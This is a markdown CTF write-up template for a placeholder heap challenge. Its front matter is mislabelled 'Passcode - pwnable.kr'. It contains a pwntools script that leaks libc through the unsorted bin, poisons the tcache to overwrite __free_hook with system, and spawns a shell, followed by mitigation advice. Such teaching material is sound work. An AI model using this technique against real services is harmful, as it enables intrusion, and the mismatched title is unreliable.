---
title: "Passcode - pwnable.kr"
date: 2024-11-15T10:30:00Z
category: "ctf"
tags: ["demo", "template", "heap-exploitation"]
challenge_category: "pwn"
challenge_points: 450
challenge_solves: 12
summary: "Demo template for heap exploitation writeups - demonstrates proper formatting and structure."
ctf_name: "Demo CTF"
image: "https://pwnable.kr/img/passcode.png"
image_fit: "contain"
---

# Demo Heap Challenge - Demo CTF

**Category**: pwn
**Points**: 450
**Solves**: 12

*This is a demo template showing the proper structure for CTF writeups.*

## Challenge Description

```
[Challenge description from CTF organizers would go here]

nc challenge.example.com 31337
```

**Files**: `binary_name`, `libc.so.6`

## Initial Analysis

Binary checksec and basic reconnaissance:

```bash
$ file binary_name
binary_name: ELF 64-bit LSB executable, x86-64, dynamically linked

$ checksec binary_name
[*] '/path/to/binary_name'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Static Analysis

Decompiled pseudocode from Ghidra/IDA would go here:

```c
void main() {
    setup();
    puts("Welcome to the challenge!");

    while (1) {
        menu();
        int choice = get_int();

        switch (choice) {
            case 1: allocate_chunk(); break;
            case 2: free_chunk(); break;
            case 3: edit_chunk(); break;
            case 4: view_chunk(); break;
            case 5: exit(0); break;
            default: puts("Invalid choice"); break;
        }
    }
}
```

Key functions analysis:

### allocate_chunk()
```c
void allocate_chunk() {
    int idx = get_index();
    // Function implementation details
}
```

### free_chunk()
```c
void free_chunk() {
    int idx = get_index();
    // Function implementation with potential bug
}
```

## Vulnerability Analysis

Description of the vulnerability found:
- **Vulnerability Type**: (e.g., Use-After-Free, Buffer Overflow, Double-Free)
- **Location**: Where it occurs in the code
- **Primitives**: What capabilities it provides (arbitrary read/write, info leak, etc.)

Example vulnerability description:
1. The vulnerability allows editing freed chunks
2. This leads to heap metadata corruption
3. Can achieve arbitrary write primitive

## Exploitation Strategy

High-level exploitation plan:

1. **Leak libc addresses** using unsorted bin or other technique
2. **Gain primitive** through tcache/fastbin poisoning or similar
3. **Overwrite target** such as `__free_hook` or `__malloc_hook`
4. **Trigger shell** by executing system("/bin/sh") or equivalent

## Exploitation Implementation

```python
#!/usr/bin/env python3
from pwn import *

# Setup
context.arch = 'amd64'
context.log_level = 'debug'

# Connection
if args.REMOTE:
    p = remote('challenge.example.com', 31337)
else:
    p = process('./binary_name')

# Helper functions
def allocate(idx, size):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

def view(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Index: ', str(idx).encode())

# Step 1: Leak libc base
log.info("Step 1: Leaking libc base address")

# Create chunks for leak
allocate(0, 0x420)  # Large chunk for unsorted bin
allocate(1, 0x20)   # Prevent consolidation

# Free and leak
free(0)
view(0)
p.recvuntil(b'Data: ')
leak = u64(p.recvline().strip().ljust(8, b'\x00'))

# Calculate addresses
libc_base = leak - 0x1ebbe0  # Adjust offset for your libc version
system = libc_base + 0x55410
free_hook = libc_base + 0x1eee48

log.success(f"Libc base: {hex(libc_base)}")

# Step 2: Tcache poisoning or similar technique
log.info("Step 2: Performing heap exploitation")

# Exploitation steps here
allocate(3, 0x60)
allocate(4, 0x60)
free(3)
free(4)

# Corrupt tcache linked list
edit(4, p64(free_hook))

# Step 3: Get arbitrary write
log.info("Step 3: Getting arbitrary write primitive")

# Allocate to get control
allocate(6, 0x60)
allocate(7, 0x60)

# Write to target
edit(7, p64(system))

# Step 4: Get shell
log.info("Step 4: Getting shell")

# Trigger exploit
allocate(9, 0x20)
edit(9, b"/bin/sh\x00")
free(9)

# Shell!
p.interactive()
```

## Key Insights

- Understanding of heap allocator internals is crucial
- Modern mitigations require creative bypass techniques
- Heap feng shui is often necessary for reliable exploitation
- Information leaks are typically required to defeat ASLR

## Mitigation

The vulnerability could be prevented by:
- Setting pointers to NULL after freeing
- Implementing proper bounds checking
- Using memory-safe languages or smart pointers
- Enabling additional heap protections (e.g., GWP-ASan, tcache hardening)

---

**Flag**: `FLAG{demo_flag_format_here}`
